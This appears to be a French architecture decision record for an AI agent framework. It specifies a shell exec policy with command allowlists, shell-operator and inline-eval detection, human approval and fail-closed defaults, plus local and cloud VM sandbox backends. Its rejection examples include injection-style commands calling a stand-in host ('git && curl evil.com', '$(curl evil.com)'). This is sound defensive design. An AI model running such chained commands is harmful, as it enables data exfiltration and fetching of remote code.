# ADR-010 : Exec Policy + Dual Sandbox Backend

**Statut :** Accepté **Date :** 2026-03-27 **Étend :** ADR-005 (permissions par
intersection)

## Contexte

ADR-005 définit les permissions Sandbox par intersection tool × agent. Mais deux
problèmes restent ouverts :

1. **`sh -c` bypass les `--allow-*` de Deno.** Le `ShellTool` actuel utilise
   `new Deno.Command("sh", ["-c", command])`. Avec `--allow-run=sh`, l'agent
   exécute n'importe quel binaire via le shell intermédiaire — les flags Deno ne
   protègent plus rien.

2. **Deux backends sandbox.** En local, on utilise un subprocess Deno avec
   `--allow-*` flags (isolation V8, pas d'isolation OS). En cloud,
   `@deno/sandbox` fournit des micro-VMs Firecracker (isolation hardware). Les
   garanties de sécurité ne sont pas les mêmes.

## Décision

### 1. Exec Policy sur le ShellTool

Inspiré du modèle OpenClaw, le shell n'est plus "libre par défaut". Chaque agent
déclare une **exec policy** :

```typescript
interface ExecPolicy {
  /** Niveau de sécurité */
  security: "deny" | "allowlist" | "full";
  /** Commandes autorisées (binaires, premier mot) */
  allowedCommands?: string[];
  /** Commandes explicitement interdites */
  deniedCommands?: string[];
  /** Comportement quand une commande n'est pas dans l'allowlist */
  ask: "off" | "on-miss" | "always";
  /** Comportement quand le canal d'approbation est indisponible */
  askFallback: "deny" | "allowlist";
  /** Variables d'environnement filtrées du subprocess */
  envFilter?: string[];
  /** Bloquer les flags d'eval inline (-c, -e) sur les interpréteurs connus */
  strictInlineEval?: boolean;
}
```

#### Niveaux de sécurité

| `security`  | Comportement                                                                        |
| ----------- | ----------------------------------------------------------------------------------- |
| `deny`      | Aucune exécution shell. Le tool retourne une erreur structurée.                     |
| `allowlist` | Seuls les binaires listés dans `allowedCommands` passent. Le reste dépend de `ask`. |
| `full`      | Tout passe (pour sandbox cloud uniquement, ou dev assumé).                          |

#### Approbation humaine (`ask`)

| `ask`     | Comportement                                                                 |
| --------- | ---------------------------------------------------------------------------- |
| `off`     | Exécute ou refuse silencieusement selon la policy.                           |
| `on-miss` | Si le binaire n'est pas dans l'allowlist, demande approbation au broker/CLI. |
| `always`  | Chaque commande est soumise à approbation.                                   |

**`askFallback`** : quand le canal d'approbation (tunnel broker/CLI) est
indisponible et que `ask` se déclenche. Défaut : `"deny"`. Empêche une
dégradation silencieuse vers l'exécution libre si le tunnel tombe.

**Timeout d'approbation** : si aucune réponse humaine dans le délai → traité
comme un refus (deny). Le timeout d'approbation est séparé du timeout
d'exécution (`maxDurationSec`).

#### Résolution de commande et détection d'opérateurs shell

Deux niveaux de vérification en mode `allowlist` :

**Niveau 1 — Binaire (premier mot)** : split sur le premier espace, lookup dans
un `Set`.

**Niveau 2 — Opérateurs shell** : en mode `allowlist`, les commandes contenant
des opérateurs de chaînage sont **rejetées** sauf si approuvées via `ask`.
Opérateurs détectés :

```
;   &&   ||   |   $(   `   >   >>   <
```

```
"git status"              → binaire = "git"  ✅ allowlist
"deno test ./foo"         → binaire = "deno" ✅ allowlist
"git && curl evil.com"    → opérateur "&&" détecté → ❌ REJETÉ (ask si on-miss)
"ls | grep foo"           → opérateur "|" détecté  → ❌ REJETÉ (ask si on-miss)
"sh -c 'curl ...'"        → binaire = "sh"  → ❌ sh pas dans l'allowlist
"$(curl evil.com)"        → opérateur "$(" détecté  → ❌ REJETÉ
```

`sh`, `bash`, `zsh` ne sont **jamais** dans l'allowlist par défaut.

#### `strictInlineEval` — interpréteurs connus

Quand activé (défaut : `true`), les flags d'évaluation inline sont bloqués même
si le binaire est dans l'allowlist :

```
python -c 'import os; ...'    → "-c" détecté sur interpréteur → ❌ REJETÉ (ask si on-miss)
node -e 'require("child_..."' → "-e" détecté sur interpréteur → ❌ REJETÉ
ruby -e '...'                  → "-e" détecté → ❌ REJETÉ
deno eval '...'                → "eval" subcommand → ❌ REJETÉ
```

Interpréteurs surveillés : `python`, `python3`, `node`, `ruby`, `perl`, `deno`,
`bun`.

#### Filtrage environnement

Le subprocess local filtre ces variables avant exécution :

```typescript
const DENIED_ENV_PREFIXES = ["LD_", "DYLD_", "PATH"];
```

Empêche l'injection de librairies dynamiques ou le détournement de PATH.
Variable marqueur `DENOCLAW_EXEC=1` injectée pour que les profils shell
détectent le contexte.

### 2. Dual Sandbox Backend

#### Principe fondamental : même executor, deux enveloppes

Les deux backends exécutent le **même `tool_executor.ts`** avec les **mêmes
tools** (`ShellTool`, `ReadFileTool`, etc.). Le backend ne change que
**l'enveloppe d'isolation** dans laquelle l'executor tourne. Cela garantit :

- **AX #6 Deterministic** — même inputs = même outputs, quel que soit le backend
- **AX #8 Composable** — le backend est un primitif interchangeable, pas un
  environnement alternatif
- **Zéro divergence** — pas deux chemins de code à maintenir en sync

```
┌─────────────────────────────────────────────────────────────┐
│ Les deux backends exécutent :                                │
│   deno run [--allow-*] tool_executor.ts '{"tool":"shell"}'  │
│                                                              │
│ LocalProcessBackend : via Deno.Command (process fils local)  │
│ DenoSandboxBackend  : via sandbox.sh (micro-VM Firecracker)  │
└─────────────────────────────────────────────────────────────┘
```

#### Interface `SandboxBackend`

```typescript
interface SandboxBackend {
  readonly kind: "local" | "cloud";

  /** Exécuter un tool dans l'environnement isolé */
  execute(req: SandboxExecRequest): Promise<SandboxExecResult>;

  /** Cloud only : le backend supporte-t-il le shell libre en sécurité ? */
  readonly supportsFullShell: boolean;

  /** Libérer les ressources (fermer la sandbox cloud, etc.) */
  close(): Promise<void>;
}

interface SandboxExecRequest {
  tool: string;
  args: Record<string, unknown>;
  permissions: SandboxPermission[];
  networkAllow?: string[];
  timeoutSec?: number;
  execPolicy: ExecPolicy;
  /** Callback pour l'approbation humaine (ask: on-miss | always) */
  onAskApproval?: (req: ApprovalRequest) => Promise<ApprovalResponse>;
}

interface ApprovalRequest {
  requestId: string;
  command: string;
  binary: string;
  reason: "not-in-allowlist" | "shell-operator" | "inline-eval" | "always-ask";
}

interface ApprovalResponse {
  approved: boolean;
  /** Si true, ajoute le binaire à l'allowlist pour la session */
  allowAlways?: boolean;
}

interface SandboxExecResult {
  success: boolean;
  output: string;
  error?: {
    code: string;
    context?: Record<string, unknown>;
    recovery?: string;
  };
}
```

#### LocalProcessBackend (mode dev/offline)

- Spawn `Deno.Command("deno", ["run", ...flags, "tool_executor.ts", input])`
  (ADR-005 intersection)
- Exec policy **enforced avant le spawn** : allowlist + opérateurs shell +
  `strictInlineEval` + ask + env filter
- `supportsFullShell: false`
- Sécurité : isolation crash + timeout + policy. Pas d'isolation OS.
- `close()` : no-op (pas de ressource persistante)

#### DenoSandboxBackend (mode cloud/prod)

- Utilise `@deno/sandbox` SDK v0.13+ (`Sandbox.create()` + `sandbox.sh`)
- Micro-VM Firecracker, isolation hardware
- `supportsFullShell: true` — le shell libre est safe (VM éphémère isolée)
- Exec policy **optionnelle** : peut être `security: "full"` car la VM isole
- Nécessite `DENO_DEPLOY_TOKEN` + internet
- `close()` : appelle `sandbox.kill()` pour détruire la VM

**Exécution** : identique au local, dans la VM :

```typescript
await sandbox.sh`deno run tool_executor.ts '${input}'`;
```

#### Lifecycle du `DenoSandboxBackend`

```
                     ToolRegistry
                         │
                  setBackend(backend)
                         │
                   ┌─────▼──────┐
                   │ SandboxBack│
                   │   end      │
                   └─────┬──────┘
                         │
     ┌───────────────────┼───────────────────┐
     │                   │                   │
execute() #1        execute() #2        execute() #N
     │                   │                   │
     ▼                   ▼                   ▼
┌─────────┐         (réutilise)         (réutilise)
│ Lazy    │              │                   │
│ init :  │              │                   │
│ 1. Sandbox.create()   │                   │
│ 2. fs.upload(tools/)  │                   │
│ 3. Stocker instance   │                   │
└────┬────┘              │                   │
     │                   │                   │
     ▼                   ▼                   ▼
sandbox.sh`...`     sandbox.sh`...`     sandbox.sh`...`
     │                   │                   │
     └───────────────────┼───────────────────┘
                         │
                   close() ← appelé par AgentLoop.close()
                         │
                   sandbox.kill()
                   VM détruite
```

**Init lazy** : la VM n'est créée qu'au premier `execute()`, pas à la
construction du backend. Cela évite de provisionner une VM si l'agent ne fait
jamais d'appel tool.

**Étapes d'initialisation** (au premier `execute()`) :

1. `Sandbox.create({ region, allowNet, timeout, env })` — provisionne la
   micro-VM
2. `sandbox.fs.upload("src/agent/tools/", "/app/tools/")` — upload
   `tool_executor.ts` + tous les tools
3. Stocker l'instance `sandbox` pour réutilisation

**Réutilisation** : un seul sandbox par agent. Les appels `execute()` suivants
réutilisent la même VM. L'état filesystem persiste entre les appels (fichiers
créés par un tool sont visibles par le suivant).

**Fermeture** : cascade depuis `AgentLoop.close()` :

```
AgentLoop.close()
  → ToolRegistry.close()       ← NOUVEAU
    → SandboxBackend.close()
      → sandbox.kill()          (cloud: détruit la VM)
      → no-op                   (local: rien à fermer)
```

`AgentLoop.close()` (existant, `loop.ts:244`) est étendu pour appeler
`this.tools.close()`. `ToolRegistry` gagne une méthode `close()` qui cascade
vers le backend.

#### Matrice des capacités

| Capacité      | LocalProcessBackend                   | DenoSandboxBackend                                                    |
| ------------- | ------------------------------------- | --------------------------------------------------------------------- |
| Executor      | `tool_executor.ts` via `Deno.Command` | `tool_executor.ts` via `sandbox.sh`                                   |
| Shell libre   | Non (allowlist + ask + opérateurs)    | Oui (VM isolée)                                                       |
| Isolation     | V8 flags + process                    | Firecracker VM                                                        |
| Réseau        | `--allow-net=host`                    | `allowNet: [host]`                                                    |
| FS            | Host filesystem (flags)               | Filesystem VM isolé + upload/download                                 |
| Secrets       | Visibles dans env (filtrées)          | Via `SandboxOptions.env` (en clair dans VM) ou `secrets` (HTTPS-only) |
| Coût          | Gratuit                               | Metered (pre-release, free tier à confirmer)                          |
| Offline       | Oui                                   | Non                                                                   |
| Réutilisation | Nouveau process par tool call         | Un sandbox par agent (multi-tools)                                    |
| Concurrence   | Illimitée                             | 5 sandboxes max/org (pre-release)                                     |
| Init          | Instantané                            | ~1s (lazy, première exécution uniquement)                             |
| `close()`     | No-op                                 | `sandbox.kill()`                                                      |

### 3. Sélection du backend — fail-closed + explicite

```typescript
// Config agent
{
  "sandbox": {
    "backend": "local",  // "local" | "cloud" — pas de "auto"
    "allowedPermissions": ["read", "write", "run", "net"],
    "execPolicy": {
      "security": "allowlist",
      "allowedCommands": ["git", "deno", "npm", "ls", "cat", "grep"],
      "ask": "on-miss",
      "askFallback": "deny",
      "strictInlineEval": true
    }
  }
}
```

**Pas de mode `"auto"`** (AX #7 — Explicit Over Implicit). Le choix du backend
est **toujours explicite** dans la config. Un backend implicite basé sur la
présence d'un env var est une source de bugs silencieux : la même config se
comporte différemment selon l'environnement, ce qui viole AX #6 (Deterministic).

Règles de sélection :

| `backend` | `DENO_DEPLOY_TOKEN` présent | Token absent                                     |
| --------- | --------------------------- | ------------------------------------------------ |
| `"cloud"` | → `DenoSandboxBackend`      | → **Erreur `SANDBOX_UNAVAILABLE`** (fail-closed) |
| `"local"` | → `LocalProcessBackend`     | → `LocalProcessBackend`                          |

**Fail-closed** : si un agent demande `"cloud"` et que le token n'est pas
disponible, l'exécution échoue avec une erreur structurée :

```typescript
{
  code: "SANDBOX_UNAVAILABLE",
  context: { backend: "cloud", reason: "DENO_DEPLOY_TOKEN not set" },
  recovery: "Set DENO_DEPLOY_TOKEN or use backend: 'local'"
}
```

**Défaut** : `"local"` si `backend` est omis dans la config. Explicite,
prévisible.

### 4. Flux d'approbation (`ask`) — Worker ↔ Broker/CLI

L'approbation se fait **avant** le spawn du subprocess/sandbox command, dans le
backend (thread Worker) :

```
SandboxBackend.execute(req)
  → vérifie execPolicy (binaire, opérateurs, inlineEval)
  → si ask déclenché :
      → req.onAskApproval({ requestId, command, binary, reason })
        │
        │ implémenté par le Worker via le protocole existant :
        │
        │   WorkerResponse { type: "ask_approval", requestId, command, binary, reason }
        │     → WorkerPool.handleWorkerMessage()
        │       → callbacks.onAskApproval(agentId, requestId, command, binary)
        │         → CLI mode : prompt terminal stdin
        │         → Gateway mode : WebSocket vers client connecté
        │       → worker.postMessage({ type: "ask_response", requestId, approved, allowAlways })
        │     → Promise résolue dans le Worker
        │
      → si approved : exécuter (spawn local ou sandbox.sh)
      → si denied : retourner erreur structurée EXEC_DENIED
      → si allowAlways : ajouter le binaire à l'allowlist de session
```

Ce pattern est symétrique aux messages `agent_send`/`agent_response` existants
dans `worker_protocol.ts`.

**Timeouts séparés** (AX #7 — Explicit) :

- `approvalTimeoutSec` : délai max pour la réponse humaine. Défaut : 60s.
  Expiration = refus.
- `maxDurationSec` : délai max pour l'exécution du tool après approbation. Déjà
  existant dans `SandboxConfig`.

Les deux sont indépendants. L'un n'inclut pas l'autre.

## Consolidation `ToolsConfig` vs `ExecPolicy`

`ToolsConfig.allowedCommands` et `ToolsConfig.deniedCommands` (actuels) sont
**dépréciés** au profit de `ExecPolicy.allowedCommands` et
`ExecPolicy.deniedCommands`. Migration :

- Si `ToolsConfig.allowedCommands` présent et `ExecPolicy` absent → migration
  automatique vers
  `ExecPolicy { security: "allowlist", allowedCommands: [...], ask: "off" }`
- Si les deux présents → `ExecPolicy` gagne, warning dans les logs
- `ToolsConfig.restrictToWorkspace` reste dans `ToolsConfig` (concerne le
  filesystem, pas l'exec policy)

## Impact sur les fichiers

| Fichier                               | Changement                                                                                                               |
| ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| `src/shared/types.ts`                 | Ajouter `ExecPolicy`, `SandboxBackend`, `SandboxExecRequest`, `SandboxExecResult`, `ApprovalRequest`, `ApprovalResponse` |
| `src/shared/mod.ts`                   | Exporter les nouveaux types                                                                                              |
| `src/agent/tools/registry.ts`         | `setSandbox()` → `setBackend(SandboxBackend)`, ajouter `close()` qui cascade vers `backend.close()`                      |
| `src/agent/tools/subprocess.ts`       | Renommé/refactoré → `backends/local.ts` (`LocalProcessBackend`)                                                          |
| `src/agent/tools/shell.ts`            | Plus de `sh -c`, exécution directe du binaire, exec policy enforced                                                      |
| `src/agent/tools/tool_executor.ts`    | `ExecutorInput.config` reçoit `execPolicy`                                                                               |
| `src/agent/tools/backends/cloud.ts`   | Nouveau : `DenoSandboxBackend` — lazy init, upload tools, `sandbox.sh`, `close()` → `sandbox.kill()`                     |
| `src/agent/tools/backends/factory.ts` | Nouveau : sélection backend `"local"` / `"cloud"`, fail-closed                                                           |
| `src/agent/loop.ts`                   | `close()` étendu : appeler `this.tools.close()`                                                                          |
| `src/agent/worker_protocol.ts`        | Messages `ask_approval` / `ask_response`                                                                                 |
| `src/agent/worker_pool.ts`            | Handler `ask_approval`, callback `onAskApproval`                                                                         |
| `src/agent/types.ts`                  | Déprécier `allowedCommands`/`deniedCommands` sur `ToolsConfig`                                                           |
| `src/cli/agents.ts`                   | Exposer `execPolicy` dans création agent                                                                                 |
| `deno.json`                           | Ajouter `@deno/sandbox` dans imports                                                                                     |

## Risques identifiés

1. **`tool_executor.ts` est un script standalone** — pas de type-check partagé
   avec le parent. `ExecutorInput.config` doit être manuellement synchronisé.
   Seuls les tests d'intégration détectent les désynchronisations.

2. **`ask` bloque le Worker** — pendant l'attente d'approbation, le Worker ne
   traite pas d'autres messages. Acceptable pour un workflow humain (réponse
   rapide). Le timeout d'approbation (60s) est séparé du timeout d'exécution
   (`maxDurationSec`).

3. **5 sandboxes max en pre-release** — pour du multi-agent, ça peut bloquer.
   Prévoir un pool/queue côté `DenoSandboxBackend` ou escalader avec Deno.

4. **Secrets `@deno/sandbox` = HTTP-only** — les secrets passés via
   `SandboxOptions.secrets` ne sont pas dans `process.env` du sandbox (injectés
   uniquement sur outbound HTTPS). Les tools CLI qui lisent des variables d'env
   doivent utiliser `SandboxOptions.env` (valeurs en clair dans la VM).
   Documenter la distinction.

5. **Zéro tests sur le chemin subprocess actuel** — le refactoring n'a aucun
   filet de sécurité. Créer les tests `LocalProcessBackend` et `ExecPolicy` en
   priorité.

6. **Upload tools dans la sandbox cloud** — au premier `execute()`, le
   `DenoSandboxBackend` upload `src/agent/tools/` dans la VM. Si les fichiers
   tools changent entre les builds, la VM peut avoir une version désynchronisée.
   Mitigation : le sandbox est éphémère (30 min max), recréé à chaque session
   agent.

## Conséquences

- Le `ShellTool` actuel (`sh -c`) est remplacé par une exécution directe du
  binaire en mode local
- La détection d'opérateurs shell et de `strictInlineEval` ajoute ~50 lignes de
  validation
- Le champ `ExecPolicy` s'ajoute à `SandboxConfig` dans les types partagés
- Le `ToolRegistry` gagne `close()` pour le lifecycle du backend, cascadé depuis
  `AgentLoop.close()`
- Le `ToolRegistry` passe par `SandboxBackend.execute()` au lieu de
  `executeInSubprocess()` directement
- Le callback `ask` utilise le protocole Worker existant (symétrique à
  `agent_send`)
- `@deno/sandbox` (jsr:@deno/sandbox) à ajouter dans `deno.json` imports
- `ToolsConfig.allowedCommands/deniedCommands` dépréciés → migration auto vers
  `ExecPolicy`
- Plus de mode `"auto"` — le backend est toujours choisi explicitement (AX #7)

## Vérification AX

| #  | Principe                 | Application dans cet ADR                                                                                                                 |
| -- | ------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------- |
| 1  | No Verb Overlap          | `security` ≠ `ask` ≠ `askFallback` — champs distincts, sémantiques non ambiguës                                                          |
| 2  | Safe Defaults            | `security: "allowlist"`, `ask: "on-miss"`, `askFallback: "deny"`, `strictInlineEval: true`, `backend: "local"`                           |
| 3  | Structured Outputs       | `SandboxExecResult` avec `StructuredError` (`code` + `context` + `recovery`)                                                             |
| 4  | Machine-Readable Errors  | `SANDBOX_UNAVAILABLE`, `EXEC_DENIED`, `SANDBOX_PERMISSION_DENIED` — codes enum                                                           |
| 5  | Fast Fail Early          | Exec policy vérifié **avant** le spawn, pas dans le subprocess                                                                           |
| 6  | Deterministic            | Même config = même backend = même comportement. Pas de `"auto"`                                                                          |
| 7  | Explicit Over Implicit   | Backend choisi dans la config, pas par env var. Fail-closed sur `"cloud"` sans token. Timeouts séparés. Warning sur ToolsConfig déprécié |
| 8  | Composable               | `SandboxBackend` est interchangeable. Même `tool_executor.ts` dans les deux backends                                                     |
| 9  | Narrow Contracts         | `SandboxExecRequest` = minimum requis. `ExecPolicy` = champs optionnels avec défauts safe                                                |
| 10 | Co-located Documentation | ADR à côté du code. Tests = documentation exécutable                                                                                     |
| 11 | Test-First Invariants    | Tests `ExecPolicy` et `LocalProcessBackend` en priorité avant le refactoring                                                             |

## Références

- ADR-005 : Permissions Sandbox par intersection
- ADR-001 : Agents in Subhosting, code execution in Sandbox
- OpenClaw exec tool : https://docs.openclaw.ai/tools/exec
- OpenClaw exec approvals : https://docs.openclaw.ai/tools/exec-approvals
- OpenClaw node host : https://docs.openclaw.ai/cli/node
- Deno Sandbox docs : https://docs.deno.com/sandbox/
- `@deno/sandbox` JSR : https://jsr.io/@deno/sandbox (v0.13.2, pre-release)
